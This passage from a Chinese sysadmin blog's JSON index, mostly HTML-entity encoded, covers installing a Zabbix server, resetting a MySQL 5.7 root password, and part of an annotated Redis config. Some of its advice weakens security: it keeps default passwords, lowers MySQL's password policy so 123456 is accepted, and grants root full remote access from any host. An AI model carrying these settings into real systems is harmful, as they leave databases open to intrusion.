&#x56DE;&#x5230;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x5217;&#x8868;&#xFF0C;&#x70B9;&#x51FB;&#x3010;&#x9879;&#x76EE;&#x3011; &#x67E5;&#x770B;&#x521A;&#x624D;&#x6DFB;&#x52A0;&#x7684;&#x6A21;&#x677F;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x662F;&#x5426;&#x751F;&#x6548;&#xFF0C;&#x7EFF;&#x8272;&#x4EE3;&#x8868;&#x6210;&#x529F;&#x3002; &#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x4E3B;&#x673A;&#x5217;&#x8868;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;, &#x8FDB;&#x5165;&#x67D0;&#x4E2A;&#x5177;&#x4F53;&#x76D1;&#x63A7;&#x9879;&#x540E;&#xFF0C;&#x518D;&#x70B9;&#x51FB;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"}]},{"title":"zabbix server安装详解","slug":"zabbix server安装详解","date":"2016-09-23T14:41:19.000Z","updated":"2017-01-12T09:35:03.956Z","comments":true,"path":"2016/09/23/zabbix server安装详解/","link":"","permalink":"http://www.wangxin123.com/2016/09/23/zabbix server安装详解/","excerpt":"&#x7B80;&#x4ECB;zabbix&#xFF08;&#x97F3;&#x540C; z&#xE6;bix&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;WEB&#x754C;&#x9762;&#x7684;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x76D1;&#x89C6;&#x529F;&#x80FD;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x5F00;&#x6E90;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;zabbix&#x80FD;&#x76D1;&#x89C6;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x53C2;&#x6570;&#xFF0C;&#x4FDD;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x8FD0;&#x8425;&#xFF1B;&#x5E76;&#x63D0;&#x4F9B;&#x7075;&#x6D3B;&#x7684;&#x901A;&#x77E5;&#x673A;&#x5236;&#x4EE5;&#x8BA9;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D;/&#x89E3;&#x51B3;&#x5B58;&#x5728;&#x7684;&#x5404;&#x79CD;&#x95EE;&#x9898;&#x3002; zabbix&#x7531;2&#x90E8;&#x5206;&#x6784;&#x6210;&#xFF0C;zabbix server&#x4E0E;&#x53EF;&#x9009;&#x7EC4;&#x4EF6;zabbix agent&#x3002;zabbix server&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SNMP&#xFF0C;zabbix agent&#xFF0C;ping&#xFF0C;&#x7AEF;&#x53E3;&#x76D1;&#x89C6;&#x7B49;&#x65B9;&#x6CD5;&#x63D0;&#x4F9B;&#x5BF9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;/&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x6570;&#x636E;&#x6536;&#x96C6;&#x7B49;&#x529F;&#x80FD;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x5728;Linux&#xFF0C;Solaris&#xFF0C;HP-UX&#xFF0C;AIX&#xFF0C;Free BSD&#xFF0C;Open BSD&#xFF0C;OS X&#x7B49;&#x5E73;&#x53F0;&#x4E0A;&#x3002; &#x5B89;&#x88C5;Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm","keywords":null,"text":"&#x7B80;&#x4ECB;zabbix&#xFF08;&#x97F3;&#x540C; z&#xE6;bix&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;WEB&#x754C;&#x9762;&#x7684;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x76D1;&#x89C6;&#x529F;&#x80FD;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x5F00;&#x6E90;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;zabbix&#x80FD;&#x76D1;&#x89C6;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x53C2;&#x6570;&#xFF0C;&#x4FDD;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x8FD0;&#x8425;&#xFF1B;&#x5E76;&#x63D0;&#x4F9B;&#x7075;&#x6D3B;&#x7684;&#x901A;&#x77E5;&#x673A;&#x5236;&#x4EE5;&#x8BA9;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D;/&#x89E3;&#x51B3;&#x5B58;&#x5728;&#x7684;&#x5404;&#x79CD;&#x95EE;&#x9898;&#x3002; zabbix&#x7531;2&#x90E8;&#x5206;&#x6784;&#x6210;&#xFF0C;zabbix server&#x4E0E;&#x53EF;&#x9009;&#x7EC4;&#x4EF6;zabbix agent&#x3002;zabbix server&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SNMP&#xFF0C;zabbix agent&#xFF0C;ping&#xFF0C;&#x7AEF;&#x53E3;&#x76D1;&#x89C6;&#x7B49;&#x65B9;&#x6CD5;&#x63D0;&#x4F9B;&#x5BF9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;/&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x6570;&#x636E;&#x6536;&#x96C6;&#x7B49;&#x529F;&#x80FD;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x5728;Linux&#xFF0C;Solaris&#xFF0C;HP-UX&#xFF0C;AIX&#xFF0C;Free BSD&#xFF0C;Open BSD&#xFF0C;OS X&#x7B49;&#x5E73;&#x53F0;&#x4E0A;&#x3002; &#x5B89;&#x88C5;Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm Installing Zabbix packagesInstall Zabbix packages. Example for Zabbix server and web frontend with mysql database. 1yum install zabbix-server-mysql zabbix-web-mysql Example for installing Zabbix agent only.1yum install zabbix-agent zabbix-agent&#x9700;&#x8981;&#x5B89;&#x88C5;&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x8BE6;&#x89C1;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x6863;&#x300A;zabbix agent&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x300B; Creating initial databaseCreate zabbix database and user on MySQL. 1234# mysql -urootmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;mysql&gt; exit Import initial schema and data.1234cd /usr/share/doc/zabbix-server-mysql-2.2.0/createmysql -uroot zabbix &lt; schema.sqlmysql -uroot zabbix &lt; images.sqlmysql -uroot zabbix &lt; data.sql Starting Zabbix server processEdit database configuration in zabbix_server.conf12345# vi /etc/zabbix/zabbix_server.confDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=zabbix Start Zabbix server process.1service zabbix-server start Editing PHP configuration for Zabbix frontendApache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured. 123456php_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300# php_value date.timezone Europe/Riga It&#x2019;s necessary to uncomment the &#x201C;date.timezone&#x201D; setting and set the right timezone for you. After changing the configuration file restart the apache web server. &#x5982;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x6B64;&#x5904;&#x65F6;&#x533A;&#x914D;&#x7F6E;&#x9879;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF0C;&#x53EF;&#x6539;&#x4E3A; php_value date.timezone Asia/Shanghai 1service httpd restart Zabbix frontend is available at http://zabbix-frontend-hostname/zabbix in the browser.Default username/password is Admin/zabbix. 123# &#x8BBE;&#x7F6E;&#x81EA;&#x542F;&#x52A8;chkconfig httpd onchkconfig --list|grep httpd &#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x3010;&#x767B;&#x9646;&#x3011;-&gt;&#x3010;profile&#x3011;-&gt;&#x3010;User&#x3011;&#xFF0C;language&#x6539;&#x4E3A;chinese[zh_CN]. &#x4E2D;&#x6587;&#x4E71;&#x7801;&#x7531;&#x4E8E;zabbix&#x7684;web&#x524D;&#x7AEF;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;zabbix&#x56FE;&#x5F62;&#x5316;&#x663E;&#x793A;&#x65F6;&#x4E0B;&#x9762;&#x7684;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x65B9;&#x6846;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x62F7;&#x8D1D;&#x4E2D;&#x6587;&#x5B57;&#x4F53;&#x5230;zabbix&#x524D;&#x7AEF;&#x3002; 1.&#x8FDB;&#x5165;c:\\Windows\\Fonts&#xFF0C;&#x9009;&#x62E9;&#x5176;&#x4E2D;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#x4F8B;&#x5982;&#x6977;&#x4F53;&#x6587;&#x4EF6;simkai.ttf&#xFF0C;&#x5C06;&#x5176;&#x62F7;&#x8D1D;&#x81F3;zabbix&#x7684;web &#x524D;&#x7AEF;&#x9875;&#x9762;&#x5B57;&#x4F53;/usr/share/zabbix/fonts &#x4E0B;12[root@iZ94ekimlddZ fonts]# lsgraphfont.ttf simkai.ttf 2.&#x4FEE;&#x6539;zabbix&#x7684;web&#x524D;&#x7AEF; defines.inc.php1234567891011# vim /usr/share/zabbix/include/defines.inc.php&#x627E;&#x5230;define(&apos;ZBX_FONT_NAME&apos;, &apos;DejaVuSans&apos;);define(&apos;ZBX_GRAPH_FONT_NAME&apos;, &apos;DejaVuSans&apos;); &#x8FD9;2&#x884C;&#x4FEE;&#x6539;&#x4E3A;define(&apos;ZBX_FONT_NAME&apos;, &apos;SIMKAI&apos;);define(&apos;ZBX_GRAPH_FONT_NAME&apos;, &apos;SIMKAI&apos;); &#x4FDD;&#x5B58;&#x9000;&#x51FA; &#x5176;&#x4ED6;Zabbix&#x5B98;&#x7F51;&#x5B89;&#x88C5;&#x6559;&#x7A0B;(&#x7FFB;&#x5899;)&#xFF1A;https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos zabbix&#x4E2D;&#x6587;&#x64CD;&#x4F5C;&#x624B;&#x518C;&#xFF1A;http://pan.baidu.com/s/1i46GoQh &#x5BC6;&#x7801;&#xFF1A;xw5n (&#x624B;&#x518C;&#x4E2D;&#x6709;&#x76F8;&#x5173;shell&#x811A;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;) zabbix_agentd.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/ zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/ grafana-zabbix&#x63D2;&#x4EF6;&#x5B89;&#x88C5;&#xFF1A;&#x5728;grafana&#x63D2;&#x4EF6;&#x4E2D;&#x5FC3;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x76F8;&#x5173;&#x6570;&#x636E;&#x6E90;&#xFF1A;http://blog.csdn.net/zk673820543/article/details/50617412 grafana-zabbix&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#x3010;&#x5185;&#x542B;gif&#x56FE;&#x3011;&#xFF1A;https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"}]},{"title":"Mysql5.7忘记root密码及修改root密码的方法","slug":"Mysql5.7忘记root密码及修改root密码的方法","date":"2016-09-20T14:41:19.000Z","updated":"2017-01-02T08:33:47.433Z","comments":true,"path":"2016/09/20/Mysql5.7忘记root密码及修改root密码的方法/","link":"","permalink":"http://www.wangxin123.com/2016/09/20/Mysql5.7忘记root密码及修改root密码的方法/","excerpt":"Mysql &#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x8F93;&#x5165; mysql &#x2013;version &#x663E;&#x793A;&#x7248;&#x672C;&#x5982;&#x4E0B;1mysql Ver 14.14 Distrib 5.7.13-6, for Linux (x86_64) using 6.0 &#x7528;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;1234mysqladmin -uroot -p password &apos;newpassword&apos;Enter password:mysqladmin: connect to server at &apos;localhost&apos; failederror: &apos;Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)&apos; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;1234567891011/etc/init.d/mysql stopmysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp;mysql -u root mysqlmysql&gt; use mysqlmysql&gt; UPDATE user SET authentication_string=PASSWORD(&apos;newpassword&apos;) where USER=&apos;root&apos;;mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit/etc/init.d/mysql restartmysql -uroot -pEnter password: &lt;&#x8F93;&#x5165;&#x65B0;&#x8BBE;&#x7684;&#x5BC6;&#x7801;newpassword&gt;","keywords":null,"text":"Mysql &#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x8F93;&#x5165; mysql &#x2013;version &#x663E;&#x793A;&#x7248;&#x672C;&#x5982;&#x4E0B;1mysql Ver 14.14 Distrib 5.7.13-6, for Linux (x86_64) using 6.0 &#x7528;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;1234mysqladmin -uroot -p password &apos;newpassword&apos;Enter password:mysqladmin: connect to server at &apos;localhost&apos; failederror: &apos;Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)&apos; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;1234567891011/etc/init.d/mysql stopmysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp;mysql -u root mysqlmysql&gt; use mysqlmysql&gt; UPDATE user SET authentication_string=PASSWORD(&apos;newpassword&apos;) where USER=&apos;root&apos;;mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit/etc/init.d/mysql restartmysql -uroot -pEnter password: &lt;&#x8F93;&#x5165;&#x65B0;&#x8BBE;&#x7684;&#x5BC6;&#x7801;newpassword&gt; &#x6CE8;&#x610F;&#xFF1A;mysql5.7&#x7248;&#x672C;mysql&#x6570;&#x636E;&#x5E93;user&#x8868;&#x7684;&#x5BC6;&#x7801;&#x5B57;&#x6BB5;&#x4E3A;authentication_string, &#x5176;&#x4ED6;&#x7248;&#x672C;&#x5927;&#x90E8;&#x5206;&#x4E3A;password&#xFF0C;update&#x8BED;&#x53E5;&#x76F8;&#x5E94;&#x4E3A;&#xFF1A;1UPDATE user SET Password=PASSWORD(&apos;newpassword&apos;) where USER=&apos;root&apos;; &#x7528;&#x91CD;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x7EC8;&#x4E8E;&#x767B;&#x5F55;&#x6210;&#x529F;&#xFF0C;&#x7ED3;&#x679C;&#x53D1;&#x73B0;&#x64CD;&#x4F5C;&#x4EFB;&#x4F55;sql&#x8BED;&#x53E5;&#x90FD;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;1You must reset your password using ALTER USER statement before executing this statement. &#x9519;&#x8BEF;&#x663E;&#x793A;&#x5728;&#x64CD;&#x4F5C;sql&#x8BED;&#x53E5;&#x524D;&#x5FC5;&#x987B;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x8BD5;&#x4E86;&#x597D;&#x51E0;&#x4E2A;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x8BED;&#x53E5;&#x90FD;&#x91CD;&#x7F6E;&#x5931;&#x8D25;&#xFF0C;&#x9677;&#x5165;&#x4E86;&#x6B7B;&#x5FAA;&#x73AF;&#x3002;&#x8FD9;&#x65F6;&#x53D1;&#x73B0;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x9700;&#x4F7F;&#x7528; Alter USER &#x8BED;&#x53E5;&#xFF0C;&#x624D;&#x627E;&#x5230;&#x4E86;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x662F;&#x53C8;&#x62A5;&#x5BC6;&#x7801;&#x8FC7;&#x4E8E;&#x7B80;&#x5355;&#x7684;&#x9519;&#x8BEF;&#x3002; 12mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;123&apos;; ERROR 1819 (HY000): Your password does not satisfy the current policy requirements &#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x5176;&#x5B9E;&#x4E0E;validate_password_policy&#x6709;&#x5173;&#xFF0C;mysql5.6&#x7248;&#x672C;&#x540E;&#xFF0C;&#x63A8;&#x51FA;&#x4E86;validate_password&#x63D2;&#x4EF6;&#xFF0C;&#x52A0;&#x5F3A;&#x4E86;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; mysql&gt; show variables like &#x201C;%vali%&#x201D; &#x547D;&#x4EE4;&#x67E5;&#x770B;validate_password_policy&#x503C;&#xFF1A; Variable_name Value validate_password_dictionary_file validate_password_length 8 validate_password_mixed_case_count 1 validate_password_number_count 1 validate_password_policy MEDIUM validate_password_special_char_count 1 validate_password_policy&#x6709;&#x4EE5;&#x4E0B;&#x53D6;&#x503C;&#xFF1A; Policy Tests Performed 0 or LOW Length 1 or MEDIUM Length; numeric, lowercase/uppercase, and special characters 2 or STRONG Length; numeric, lowercase/uppercase, and special characters; dictionary file &#x9ED8;&#x8BA4;&#x662F;1&#xFF0C;&#x5373;MEDIUM&#xFF0C;&#x6240;&#x4EE5;&#x521A;&#x5F00;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x957F;&#x5EA6;&#xFF0C;&#x4E14;&#x5FC5;&#x987B;&#x542B;&#x6709;&#x6570;&#x5B57;&#xFF0C;&#x5C0F;&#x5199;&#x6216;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#xFF0C;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;&#x6240;&#x4EE5;&#x7528;alter user&#x8BED;&#x53E5;&#x91CD;&#x8BBE;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x8BBE;&#x7F6E;&#x6210;&#x529F;&#x3002; &#x5982;&#x679C;&#x4E0D;&#x60F3;&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#xFF0C;&#x53EA;&#x60F3;&#x8BBE;&#x7F6E;root&#x7684;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;set global validate_password_policy=0;set global validate_password_length=1;select @@validate_password_length;&#x65B9;&#x6CD5;&#x8BE6;&#x89C1;http://www.cnblogs.com/ivictor/p/5142809.html &#x6700;&#x540E;&#x6388;&#x6743;root&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x6743;&#x9650;&#xFF1A;1mysql&gt; Grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;newpassword&apos; with grant option;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"Redis配置文件详解","slug":"Redis配置文件详解","date":"2016-09-20T14:10:00.000Z","updated":"2017-01-02T08:33:28.847Z","comments":true,"path":"2016/09/20/Redis配置文件详解/","link":"","permalink":"http://www.wangxin123.com/2016/09/20/Redis配置文件详解/","excerpt":"REDIS &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;:","keywords":null,"text":"REDIS &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692# redis &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;## &#x5F53;&#x4F60;&#x9700;&#x8981;&#x4E3A;&#x67D0;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x5E26;&#x4E0A;&#x5355;&#x4F4D;&#xFF0C;# &#x901A;&#x5E38;&#x7684;&#x683C;&#x5F0F;&#x5C31;&#x662F; 1k 5gb 4m &#x7B49;&#x9171;&#x7D2B;&#xFF1A;## 1k =&gt; 1000 bytes# 1kb =&gt; 1024 bytes# 1m =&gt; 1000000 bytes# 1mb =&gt; 1024*1024 bytes# 1g =&gt; 1000000000 bytes# 1gb =&gt; 1024*1024*1024 bytes## &#x5185;&#x5B58;&#x914D;&#x7F6E;&#x5927;&#x5C0F;&#x5199;&#x662F;&#x4E00;&#x6837;&#x7684;.&#x6BD4;&#x5982; 1gb 1Gb 1GB 1gB################################ &#x5E38;&#x7528; ###################################### daemonize no &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;redis&#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;# &#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yesdaemonize yes# &#x5F53;redis&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x628A;pid&#x6587;&#x4EF6;&#x653E;&#x5728;/var/run/redis.pid&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x5740;&#x3002;# &#x5F53;&#x8FD0;&#x884C;&#x591A;&#x4E2A;redis&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;pid&#x6587;&#x4EF6;&#x548C;&#x7AEF;&#x53E3;pidfile /var/run/redis.pid# &#x6307;&#x5B9A;redis&#x8FD0;&#x884C;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;6379port 6379# TCP &#x76D1;&#x542C;&#x7684;&#x6700;&#x5927;&#x5BB9;&#x7EB3;&#x6570;&#x91CF;## &#x5728;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x8C03;&#x9AD8;&#x4EE5;&#x907F;&#x514D;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x7F13;&#x6162;&#x7684;&#x95EE;&#x9898;&#x3002;# Linux &#x5185;&#x6838;&#x4F1A;&#x4E00;&#x58F0;&#x4E0D;&#x54CD;&#x7684;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x7F29;&#x5C0F;&#x6210; /proc/sys/net/core/somaxconn &#x5BF9;&#x5E94;&#x7684;&#x503C;&#xFF0C;# &#x6240;&#x4EE5;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x8FD9;&#x4E24;&#x4E2A;&#x503C;&#x624D;&#x80FD;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x9884;&#x671F;&#x3002;# tcp-backlog 511# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis &#x5728; server &#x4E0A;&#x6240;&#x6709;&#x6709;&#x6548;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;# &#x4F60;&#x5982;&#x679C;&#x53EA;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;IP&#x6216;&#x8005;&#x591A;&#x4E2A;IP&#x3002;## &#x793A;&#x4F8B;&#xFF0C;&#x591A;&#x4E2A;IP&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;:## bind 192.168.1.100 10.0.0.1bind 127.0.0.1# Specify the path for the unix socket that will be used to listen for# incoming connections. There is no default, so Redis will not listen# on a unix socket when not specified.# &#x6307;&#x5B9A; unix socket &#x7684;&#x8DEF;&#x5F84;&#x3002;## unixsocket /tmp/redis.sock# unixsocketperm 755# &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x65F6;&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x4E3A;&#x79D2;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x6CA1;&#x6709;&#x53D1;&#x51FA;&#x4EFB;&#x4F55;&#x6307;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5173;&#x95ED;&#x8BE5;&#x8FDE;&#x63A5;# 